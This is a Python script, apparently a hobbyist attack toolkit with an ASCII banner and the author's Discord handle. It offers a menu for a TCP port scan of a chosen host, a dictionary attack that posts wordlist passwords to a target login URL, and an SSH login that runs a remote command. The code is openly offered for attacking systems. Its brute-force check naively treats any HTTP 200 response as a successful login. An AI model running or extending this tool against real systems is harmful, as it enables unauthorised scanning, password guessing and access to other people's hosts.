import socket
import requests
import paramiko
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Function to generate a color gradient between two RGB colors
def get_gradient_color(start_color, end_color, ratio):
    return tuple(int(start + (end - start) * ratio) for start, end in zip(start_color, end_color))

# Function to convert RGB to ANSI escape code
def rgb_to_ansi(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

# Define the start and end colors for the gradient (blue to violet)
start_color = (0, 0, 255)
end_color = (138, 43, 226)

# Function to perform a port scan using sockets
def socket_port_scan(target_host, start_port=1, end_port=1024):
    print(Fore.YELLOW + f"[*] Performing port scan on {target_host}..." + Style.RESET_ALL)
    open_ports = []
    try:
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_host, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
    except Exception as e:
        print(Fore.RED + f"Exception: {e}" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Open ports on {target_host}: {open_ports}" + Style.RESET_ALL)

# Function to perform a dictionary attack
def dictionary_attack(target_url, username, password_list):
    try:
        print(Fore.YELLOW + f"[*] Performing dictionary attack on {target_url}..." + Style.RESET_ALL)
        for password in password_list:
            data = {'username': username, 'password': password}
            response = requests.post(target_url, data=data)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] Login successful with password: {password}" + Style.RESET_ALL)
                return
            else:
                print(Fore.RED + f"[-] Login failed with password: {password}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Exception: {e}" + Style.RESET_ALL)

# Function to manipulate remote files via SSH
def manipulate_remote_files_ssh(hostname, port, username, password):
    try:
        print(Fore.YELLOW + f"[*] Connecting to {hostname} via SSH..." + Style.RESET_ALL)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port, username, password)
        
        stdin, stdout, stderr = client.exec_command('ls')
        print(Fore.GREEN + f"[+] Files in the home directory:\n{stdout.read().decode()}" + Style.RESET_ALL)
        
        client.close()
    except Exception as e:
        print(Fore.RED + f"SSH exception: {e}" + Style.RESET_ALL)

# Text to display
text = """
░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  

BY: mindcreator9, DM ME ON DISCORD FOR ANY ISSUE OR QUESTION: mindcreator9

"""

# Split the text into lines
lines = text.split("\n")

# Determine the number of lines to apply the gradient
num_lines = len(lines)

# Apply the gradient and print the text with colors
for i, line in enumerate(lines):
    ratio = i / (num_lines - 1)
    color = get_gradient_color(start_color, end_color, ratio)
    ansi_color = rgb_to_ansi(*color)
    print(ansi_color + line + Style.RESET_ALL)

# Menu for choosing functions
while True:
    print(Fore.GREEN + "\nChoose a function:")
    print()
    print(Fore.YELLOW + "A. Port Scan")
    print()
    print(Fore.YELLOW + "B. Dictionary Attack")
    print()
    print(Fore.YELLOW + "C. Manipulate Remote Files via SSH")
    print()
    print(Fore.RED + "D. Exit")

    choice = input("Enter your choice (A/B/C/D): ").upper()

    if choice == 'A':
        target_host = input("Enter the IP address of the target host to scan: ")
        socket_port_scan(target_host)

    elif choice == 'B':
        target_url = input("Enter the target URL for the dictionary attack: ")
        username = input("Enter the username: ")
        password_file = input("Enter the path to the password dictionary file: ")

        try:
            with open(password_file, 'r') as file:
                password_list = [line.strip() for line in file.readlines()]
                dictionary_attack(target_url, username, password_list)
        except FileNotFoundError:
            print(Fore.RED + f"[-] File '{password_file}' not found." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] Exception: {e}" + Style.RESET_ALL)

    elif choice == 'C':
        hostname = input("Enter the SSH hostname: ")
        port = int(input("Enter the SSH port: "))
        username = input("Enter the SSH username: ")
        password = input("Enter the SSH password: ")
        manipulate_remote_files_ssh(hostname, port, username, password)

    elif choice == 'D':
        print("Exiting...")
        break

    else:
        print("Invalid choice. Please enter A, B, C, or D.")
